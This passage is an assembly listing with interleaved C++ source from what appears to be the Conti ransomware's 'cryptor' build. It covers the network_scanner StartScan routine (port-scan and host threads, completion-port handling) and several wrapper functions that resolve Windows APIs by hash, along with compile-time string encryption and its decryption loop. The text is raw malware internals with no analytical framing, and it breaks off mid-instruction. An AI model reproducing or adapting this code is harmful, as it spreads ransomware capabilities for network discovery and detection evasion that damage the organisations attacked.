; 664  : 		logs::Write(OBFW(L"Can't create host thread."));

  0076f	48 8d 4d a9	 lea	 rcx, QWORD PTR $T5[rbp-255]
  00773	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 681  : 	pWaitForSingleObject(hHostHandler, INFINITE);
; 682  : 
; 683  : cleanup:

  00778	e9 0c 02 00 00	 jmp	 $cleanup$1121
$LN17@StartScan:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 333  : 	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8687ce53, 82);//GetProcAddress(hKernel32, OBFA("CreateThread"));

  0077d	ba 0f 00 00 00	 mov	 edx, 15
  00782	41 b8 53 ce 87
	86		 mov	 r8d, -2037920173	; 8687ce53H
  00788	44 8d 4a 43	 lea	 r9d, QWORD PTR [rdx+67]
  0078c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 334  : 	return pFunction(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

  00791	45 33 c9	 xor	 r9d, r9d
  00794	48 89 5c 24 28	 mov	 QWORD PTR [rsp+40], rbx
  00799	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?PortScanHandler@@YAKPEAX@Z ; PortScanHandler
  007a0	89 5c 24 20	 mov	 DWORD PTR [rsp+32], ebx
  007a4	33 d2		 xor	 edx, edx
  007a6	33 c9		 xor	 ecx, ecx
  007a8	ff d0		 call	 rax
  007aa	4c 8b f0	 mov	 r14, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 670  : 	if (hPortScan == INVALID_HANDLE_VALUE) {

  007ad	48 83 f8 ff	 cmp	 rax, -1
  007b1	0f 85 63 01 00
	00		 jne	 $LN19@StartScan
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  007b7	88 5d e0	 mov	 BYTE PTR $T6[rbp-256], bl
  007ba	c6 45 e1 68	 mov	 BYTE PTR $T6[rbp-255], 104 ; 00000068H
  007be	c6 45 e2 03	 mov	 BYTE PTR $T6[rbp-254], 3
  007c2	c6 45 e3 75	 mov	 BYTE PTR $T6[rbp-253], 117 ; 00000075H
  007c6	c6 45 e4 03	 mov	 BYTE PTR $T6[rbp-252], 3
  007ca	c6 45 e5 5d	 mov	 BYTE PTR $T6[rbp-251], 93 ; 0000005dH
  007ce	c6 45 e6 03	 mov	 BYTE PTR $T6[rbp-250], 3
  007d2	c6 45 e7 3a	 mov	 BYTE PTR $T6[rbp-249], 58 ; 0000003aH
  007d6	c6 45 e8 03	 mov	 BYTE PTR $T6[rbp-248], 3
  007da	c6 45 e9 79	 mov	 BYTE PTR $T6[rbp-247], 121 ; 00000079H
  007de	c6 45 ea 03	 mov	 BYTE PTR $T6[rbp-246], 3
  007e2	c6 45 eb 6e	 mov	 BYTE PTR $T6[rbp-245], 110 ; 0000006eH
  007e6	c6 45 ec 03	 mov	 BYTE PTR $T6[rbp-244], 3
  007ea	c6 45 ed 54	 mov	 BYTE PTR $T6[rbp-243], 84 ; 00000054H
  007ee	c6 45 ee 03	 mov	 BYTE PTR $T6[rbp-242], 3
  007f2	c6 45 ef 1b	 mov	 BYTE PTR $T6[rbp-241], 27
  007f6	c6 45 f0 03	 mov	 BYTE PTR $T6[rbp-240], 3
  007fa	c6 45 f1 33	 mov	 BYTE PTR $T6[rbp-239], 51 ; 00000033H
  007fe	c6 45 f2 03	 mov	 BYTE PTR $T6[rbp-238], 3
  00802	c6 45 f3 75	 mov	 BYTE PTR $T6[rbp-237], 117 ; 00000075H
  00806	c6 45 f4 03	 mov	 BYTE PTR $T6[rbp-236], 3
  0080a	c6 45 f5 79	 mov	 BYTE PTR $T6[rbp-235], 121 ; 00000079H
  0080e	c6 45 f6 03	 mov	 BYTE PTR $T6[rbp-234], 3
  00812	c6 45 f7 33	 mov	 BYTE PTR $T6[rbp-233], 51 ; 00000033H
  00816	c6 45 f8 03	 mov	 BYTE PTR $T6[rbp-232], 3
  0081a	c6 45 f9 6e	 mov	 BYTE PTR $T6[rbp-231], 110 ; 0000006eH
  0081e	c6 45 fa 03	 mov	 BYTE PTR $T6[rbp-230], 3
  00822	c6 45 fb 3c	 mov	 BYTE PTR $T6[rbp-229], 60 ; 0000003cH
  00826	c6 45 fc 03	 mov	 BYTE PTR $T6[rbp-228], 3
  0082a	c6 45 fd 0d	 mov	 BYTE PTR $T6[rbp-227], 13
  0082e	c6 45 fe 03	 mov	 BYTE PTR $T6[rbp-226], 3
  00832	c6 45 ff 1b	 mov	 BYTE PTR $T6[rbp-225], 27
  00836	c6 45 00 03	 mov	 BYTE PTR $T6[rbp-224], 3
  0083a	c6 45 01 79	 mov	 BYTE PTR $T6[rbp-223], 121 ; 00000079H
  0083e	c6 45 02 03	 mov	 BYTE PTR $T6[rbp-222], 3
  00842	c6 45 03 6e	 mov	 BYTE PTR $T6[rbp-221], 110 ; 0000006eH
  00846	c6 45 04 03	 mov	 BYTE PTR $T6[rbp-220], 3
  0084a	c6 45 05 4a	 mov	 BYTE PTR $T6[rbp-219], 74 ; 0000004aH
  0084e	c6 45 06 03	 mov	 BYTE PTR $T6[rbp-218], 3
  00852	c6 45 07 54	 mov	 BYTE PTR $T6[rbp-217], 84 ; 00000054H
  00856	c6 45 08 03	 mov	 BYTE PTR $T6[rbp-216], 3
  0085a	c6 45 09 75	 mov	 BYTE PTR $T6[rbp-215], 117 ; 00000075H
  0085e	c6 45 0a 03	 mov	 BYTE PTR $T6[rbp-214], 3
  00862	c6 45 0b 5d	 mov	 BYTE PTR $T6[rbp-213], 93 ; 0000005dH
  00866	c6 45 0c 03	 mov	 BYTE PTR $T6[rbp-212], 3
  0086a	c6 45 0d 6e	 mov	 BYTE PTR $T6[rbp-211], 110 ; 0000006eH
  0086e	c6 45 0e 03	 mov	 BYTE PTR $T6[rbp-210], 3
  00872	c6 45 0f 79	 mov	 BYTE PTR $T6[rbp-209], 121 ; 00000079H
  00876	c6 45 10 03	 mov	 BYTE PTR $T6[rbp-208], 3
  0087a	c6 45 11 41	 mov	 BYTE PTR $T6[rbp-207], 65 ; 00000041H
  0087e	c6 45 12 03	 mov	 BYTE PTR $T6[rbp-206], 3
  00882	c6 45 13 1b	 mov	 BYTE PTR $T6[rbp-205], 27
  00886	c6 45 14 03	 mov	 BYTE PTR $T6[rbp-204], 3
  0088a	c6 45 15 33	 mov	 BYTE PTR $T6[rbp-203], 51 ; 00000033H
  0088e	c6 45 16 03	 mov	 BYTE PTR $T6[rbp-202], 3
  00892	c6 45 17 75	 mov	 BYTE PTR $T6[rbp-201], 117 ; 00000075H
  00896	c6 45 18 03	 mov	 BYTE PTR $T6[rbp-200], 3
  0089a	c6 45 19 04	 mov	 BYTE PTR $T6[rbp-199], 4
  0089e	c6 45 1a 03	 mov	 BYTE PTR $T6[rbp-198], 3
  008a2	c6 45 1b 06	 mov	 BYTE PTR $T6[rbp-197], 6
  008a6	c6 45 1c 03	 mov	 BYTE PTR $T6[rbp-196], 3
  008aa	c6 45 1d 03	 mov	 BYTE PTR $T6[rbp-195], 3
  008ae	c6 45 1e 03	 mov	 BYTE PTR $T6[rbp-194], 3
  008b2	0f b6 45 e1	 movzx	 eax, BYTE PTR $T6[rbp-255]

; 58   :         return m_isDecrypted;

  008b6	0f b6 45 e0	 movzx	 eax, BYTE PTR $T6[rbp-256]

; 63   :         if (!isDecrypted())

  008ba	84 c0		 test	 al, al
  008bc	75 51		 jne	 SHORT $LN1067@StartScan
  008be	66 90		 npad	 2
$LL1068@StartScan:

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  008c0	0f b6 4c 1d e1	 movzx	 ecx, BYTE PTR $T6[rbp+rbx-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  008c5	b8 03 00 00 00	 mov	 eax, 3
  008ca	2b c1		 sub	 eax, ecx
  008cc	6b c8 1b	 imul	 ecx, eax, 27

; 40   :     return (a % n + n) % n;

  008cf	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  008d4	f7 e9		 imul	 ecx
  008d6	03 d1		 add	 edx, ecx
  008d8	c1 fa 06	 sar	 edx, 6
  008db	8b c2		 mov	 eax, edx
  008dd	c1 e8 1f	 shr	 eax, 31
  008e0	03 d0		 add	 edx, eax
  008e2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  008e5	2b c8		 sub	 ecx, eax
  008e7	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  008ec	83 c1 7f	 add	 ecx, 127		; 0000007fH
  008ef	f7 e9		 imul	 ecx
  008f1	03 d1		 add	 edx, ecx
  008f3	c1 fa 06	 sar	 edx, 6
  008f6	8b c2		 mov	 eax, edx
  008f8	c1 e8 1f	 shr	 eax, 31
  008fb	03 d0		 add	 edx, eax
  008fd	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00900	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00902	88 4c 1d e1	 mov	 BYTE PTR $T6[rbp+rbx-255], cl
  00906	48 ff c3	 inc	 rbx
  00909	48 83 fb 3e	 cmp	 rbx, 62			; 0000003eH
  0090d	72 b1		 jb	 SHORT $LL1068@StartScan
$LN1067@StartScan:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 672  : 		logs::Write(OBFW(L"Can't create port scan thread."));

  0090f	48 8d 4d e1	 lea	 rcx, QWORD PTR $T6[rbp-255]
  00913	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 673  : 		goto cleanup;

  00918	eb 6f		 jmp	 SHORT $cleanup$1121
$LN19@StartScan:

; 674  : 
; 675  : 	}
; 676  : 
; 677  : 	pPostQueuedCompletionStatus(g_IocpHandle, 0, START_COMPLETION_KEY, NULL);

  0091a	48 8b 1d 00 00
	00 00		 mov	 rbx, QWORD PTR ?g_IocpHandle@@3PEAXEA ; g_IocpHandle
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 458  : 	pFunction = (BOOL(WINAPI*)(HANDLE, DWORD, ULONG_PTR, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x442d716b, 70);//GetProcAddress(hKernel32, OBFA("PostQueuedCompletionStatus"));

  00921	ba 0f 00 00 00	 mov	 edx, 15
  00926	41 b8 6b 71 2d
	44		 mov	 r8d, 1143828843		; 442d716bH
  0092c	44 8d 4a 37	 lea	 r9d, QWORD PTR [rdx+55]
  00930	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 459  : 	return pFunction(CompletionPort, dwNumberOfBytesTransferred, dwCompletionKey, lpOverlapped);

  00935	45 33 c9	 xor	 r9d, r9d
  00938	33 d2		 xor	 edx, edx
  0093a	48 8b cb	 mov	 rcx, rbx
  0093d	45 8d 41 01	 lea	 r8d, QWORD PTR [r9+1]
  00941	ff d0		 call	 rax

; 159  : 	pFunction = (DWORD(WINAPI*)(HANDLE, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe0c23134, 98);//GetProcAddress(hKernel32, OBFA("WaitForSingleObject"));

  00943	ba 0f 00 00 00	 mov	 edx, 15
  00948	41 b8 34 31 c2
	e0		 mov	 r8d, -524144332		; e0c23134H
  0094e	44 8d 4a 53	 lea	 r9d, QWORD PTR [rdx+83]
  00952	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 160  : 	return pFunction(hHandle, dwMilliseconds);

  00957	ba ff ff ff ff	 mov	 edx, -1			; ffffffffH
  0095c	49 8b ce	 mov	 rcx, r14
  0095f	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 680  : 	AddHost(STOP_MARKER);

  00961	b9 ff ff ff ff	 mov	 ecx, -1			; ffffffffH
  00966	e8 00 00 00 00	 call	 ?AddHost@@YAHK@Z	; AddHost
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 159  : 	pFunction = (DWORD(WINAPI*)(HANDLE, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe0c23134, 98);//GetProcAddress(hKernel32, OBFA("WaitForSingleObject"));

  0096b	ba 0f 00 00 00	 mov	 edx, 15
  00970	41 b8 34 31 c2
	e0		 mov	 r8d, -524144332		; e0c23134H
  00976	44 8d 4a 53	 lea	 r9d, QWORD PTR [rdx+83]
  0097a	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 160  : 	return pFunction(hHandle, dwMilliseconds);

  0097f	ba ff ff ff ff	 mov	 edx, -1			; ffffffffH
  00984	48 8b ce	 mov	 rcx, rsi
  00987	ff d0		 call	 rax
$cleanup$1121:

; 495  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x22d94276, 66);//GetProcAddress(hKernel32, OBFA("DeleteCriticalSection"));

  00989	ba 0f 00 00 00	 mov	 edx, 15
  0098e	41 b8 76 42 d9
	22		 mov	 r8d, 584663670		; 22d94276H
  00994	44 8d 4a 33	 lea	 r9d, QWORD PTR [rdx+51]
  00998	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 496  : 	return pFunction(lpCriticalSection);

  0099d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  009a4	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 685  : 	if (g_IocpHandle) {

  009a6	48 8b 1d 00 00
	00 00		 mov	 rbx, QWORD PTR ?g_IocpHandle@@3PEAXEA ; g_IocpHandle
  009ad	48 85 db	 test	 rbx, rbx
  009b0	74 19		 je	 SHORT $LN21@StartScan
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  009b2	ba 0f 00 00 00	 mov	 edx, 15
  009b7	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  009bd	44 8d 4a 4c	 lea	 r9d, QWORD PTR [rdx+76]
  009c1	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  009c6	48 8b cb	 mov	 rcx, rbx
  009c9	ff d0		 call	 rax
$LN21@StartScan:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 688  : 	if (hHostHandler) {

  009cb	48 85 f6	 test	 rsi, rsi
  009ce	74 19		 je	 SHORT $LN22@StartScan
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  009d0	ba 0f 00 00 00	 mov	 edx, 15
  009d5	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  009db	44 8d 4a 4c	 lea	 r9d, QWORD PTR [rdx+76]
  009df	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  009e4	48 8b ce	 mov	 rcx, rsi
  009e7	ff d0		 call	 rax
$LN22@StartScan:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 691  : 	if (hPortScan) {

  009e9	4d 85 f6	 test	 r14, r14
  009ec	74 19		 je	 SHORT $LN23@StartScan
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  009ee	ba 0f 00 00 00	 mov	 edx, 15
  009f3	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  009f9	44 8d 4a 4c	 lea	 r9d, QWORD PTR [rdx+76]
  009fd	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  00a02	49 8b ce	 mov	 rcx, r14
  00a05	ff d0		 call	 rax
$LN23@StartScan:

; 974  : 	pFunction = (int(WINAPI*)())getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xc84f6620, 26);//GetProcAddress(hWs2_32, OBFA("WSACleanup"));

  00a07	ba 15 00 00 00	 mov	 edx, 21
  00a0c	41 b8 20 66 4f
	c8		 mov	 r8d, -934320608		; c84f6620H
  00a12	44 8d 4a 05	 lea	 r9d, QWORD PTR [rdx+5]
  00a16	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 975  : 	return pFunction();

  00a1b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 696  : }

  00a1d	48 8b 8d 30 03
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  00a24	48 33 cc	 xor	 rcx, rsp
  00a27	e8 00 00 00 00	 call	 __security_check_cookie
  00a2c	4c 8d 9c 24 40
	04 00 00	 lea	 r11, QWORD PTR [rsp+1088]
  00a34	49 8b 5b 10	 mov	 rbx, QWORD PTR [r11+16]
  00a38	49 8b 73 18	 mov	 rsi, QWORD PTR [r11+24]
  00a3c	49 8b 7b 20	 mov	 rdi, QWORD PTR [r11+32]
  00a40	4d 8b 73 28	 mov	 r14, QWORD PTR [r11+40]
  00a44	49 8b e3	 mov	 rsp, r11
  00a47	5d		 pop	 rbp
  00a48	c3		 ret	 0
?StartScan@network_scanner@@YAXXZ ENDP			; network_scanner::StartScan
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCancelIo@@YAHPEAX@Z
_TEXT	SEGMENT
hFile$ = 48
?pCancelIo@@YAHPEAX@Z PROC				; pCancelIo, COMDAT

; 49   : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 50   : 	BOOL(WINAPI * pFunction)(HANDLE);
; 51   : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1cae2a52, 109);//GetProcAddress(hKernel32, OBFA("CancelIo"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 52 2a ae
	1c		 mov	 r8d, 481176146		; 1cae2a52H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 5e	 lea	 r9d, QWORD PTR [rdx+94]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 52   : 	return pFunction(hFile);

  0001d	48 8b cb	 mov	 rcx, rbx

; 53   : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 52   : 	return pFunction(hFile);

  00025	48 ff e0	 rex_jmp rax
?pCancelIo@@YAHPEAX@Z ENDP				; pCancelIo
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z
_TEXT	SEGMENT
lpThreadAttributes$dead$ = 64
dwStackSize$dead$ = 72
lpStartAddress$ = 80
lpParameter$ = 88
dwCreationFlags$dead$ = 96
lpThreadId$dead$ = 104
?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z PROC ; pCreateThread, COMDAT

; 331  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 30	 sub	 rsp, 48			; 00000030H

; 332  : 	HANDLE(WINAPI * pFunction)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
; 333  : 	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8687ce53, 82);//GetProcAddress(hKernel32, OBFA("CreateThread"));

  0000a	ba 0f 00 00 00	 mov	 edx, 15
  0000f	49 8b d9	 mov	 rbx, r9
  00012	49 8b f8	 mov	 rdi, r8
  00015	41 b8 53 ce 87
	86		 mov	 r8d, -2037920173	; 8687ce53H
  0001b	44 8d 4a 43	 lea	 r9d, QWORD PTR [rdx+67]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 334  : 	return pFunction(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

  00024	33 c9		 xor	 ecx, ecx
  00026	4c 8b cb	 mov	 r9, rbx
  00029	48 89 4c 24 68	 mov	 QWORD PTR lpThreadId$dead$[rsp], rcx
  0002e	4c 8b c7	 mov	 r8, rdi
  00031	33 d2		 xor	 edx, edx
  00033	89 4c 24 60	 mov	 DWORD PTR dwCreationFlags$dead$[rsp], ecx

; 335  : }

  00037	48 8b 5c 24 40	 mov	 rbx, QWORD PTR [rsp+64]
  0003c	48 83 c4 30	 add	 rsp, 48			; 00000030H
  00040	5f		 pop	 rdi

; 334  : 	return pFunction(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

  00041	48 ff e0	 rex_jmp rax
?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z ENDP ; pCreateThread
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z
_TEXT	SEGMENT
phNewTimer$ = 80
TimerQueue$ = 88
Callback$dead$ = 96
DueTime$dead$ = 104
Period$dead$ = 112
Flags$dead$ = 120
Parameter$dead$ = 128
?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z PROC ; pCreateTimerQueueTimer, COMDAT

; 385  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 40	 sub	 rsp, 64			; 00000040H
  0000a	48 8b da	 mov	 rbx, rdx

; 386  : 	BOOL(WINAPI * pFunction)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
; 387  : 	pFunction = (BOOL(WINAPI*)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe59cbfdb, 77);//GetProcAddress(hKernel32, OBFA("CreateTimerQueueTimer"));

  0000d	41 b8 db bf 9c
	e5		 mov	 r8d, -442712101		; e59cbfdbH
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 3e	 lea	 r9d, QWORD PTR [rdx+62]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 388  : 	return pFunction(phNewTimer, TimerQueue, Callback, DueTime, Period, Flags, Parameter);

  00024	33 c9		 xor	 ecx, ecx
  00026	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?TimerCallback@@YAXPEAXE@Z ; TimerCallback
  0002d	89 8c 24 80 00
	00 00		 mov	 DWORD PTR Parameter$dead$[rsp], ecx
  00034	45 33 c9	 xor	 r9d, r9d
  00037	89 4c 24 78	 mov	 DWORD PTR Flags$dead$[rsp], ecx
  0003b	48 8b d3	 mov	 rdx, rbx
  0003e	48 8b cf	 mov	 rcx, rdi
  00041	c7 44 24 70 30
	75 00 00	 mov	 DWORD PTR Period$dead$[rsp], 30000 ; 00007530H

; 389  : }

  00049	48 8b 5c 24 50	 mov	 rbx, QWORD PTR [rsp+80]
  0004e	48 83 c4 40	 add	 rsp, 64			; 00000040H
  00052	5f		 pop	 rdi

; 388  : 	return pFunction(phNewTimer, TimerQueue, Callback, DueTime, Period, Flags, Parameter);

  00053	48 ff e0	 rex_jmp rax
?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z ENDP ; pCreateTimerQueueTimer
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pDeleteTimerQueue@@YAHPEAX@Z
_TEXT	SEGMENT
TimerQueue$ = 48
?pDeleteTimerQueue@@YAHPEAX@Z PROC			; pDeleteTimerQueue, COMDAT

; 403  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 404  : 	BOOL(WINAPI * pFunction)(HANDLE);
; 405  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x6998a9d3, 75);//GetProcAddress(hKernel32, OBFA("DeleteTimerQueue"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 d3 a9 98
	69		 mov	 r8d, 1771612627		; 6998a9d3H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 3c	 lea	 r9d, QWORD PTR [rdx+60]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 406  : 	return pFunction(TimerQueue);

  0001d	48 8b cb	 mov	 rcx, rbx

; 407  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 406  : 	return pFunction(TimerQueue);

  00025	48 ff e0	 rex_jmp rax
?pDeleteTimerQueue@@YAHPEAX@Z ENDP			; pDeleteTimerQueue
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z
_TEXT	SEGMENT
CompletionPort$dead$ = 64
lpNumberOfBytesTransferred$ = 72
lpCompletionKey$ = 80
lpOverlapped$ = 88
dwMilliseconds$dead$ = 96
?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z PROC ; pGetQueuedCompletionStatus, COMDAT

; 434  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 6c 24 10	 mov	 QWORD PTR [rsp+16], rbp
  0000a	48 89 74 24 18	 mov	 QWORD PTR [rsp+24], rsi
  0000f	57		 push	 rdi
  00010	48 83 ec 30	 sub	 rsp, 48			; 00000030H
  00014	48 8b 1d 00 00
	00 00		 mov	 rbx, QWORD PTR ?g_IocpHandle@@3PEAXEA ; g_IocpHandle
  0001b	48 8b ea	 mov	 rbp, rdx

; 435  : 	BOOL(WINAPI * pFunction)(HANDLE, LPDWORD, PULONG_PTR, LPOVERLAPPED*, DWORD);
; 436  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPDWORD, PULONG_PTR, LPOVERLAPPED*, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa86380c7, 72);//GetProcAddress(hKernel32, OBFA("GetQueuedCompletionStatus"));

  0001e	ba 0f 00 00 00	 mov	 edx, 15
  00023	49 8b f9	 mov	 rdi, r9
  00026	49 8b f0	 mov	 rsi, r8
  00029	41 b8 c7 80 63
	a8		 mov	 r8d, -1469873977	; a86380c7H
  0002f	44 8d 4a 39	 lea	 r9d, QWORD PTR [rdx+57]
  00033	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 437  : 	return pFunction(CompletionPort, lpNumberOfBytesTransferred, lpCompletionKey, lpOverlapped, dwMilliseconds);

  00038	4c 8b cf	 mov	 r9, rdi
  0003b	c7 44 24 60 ff
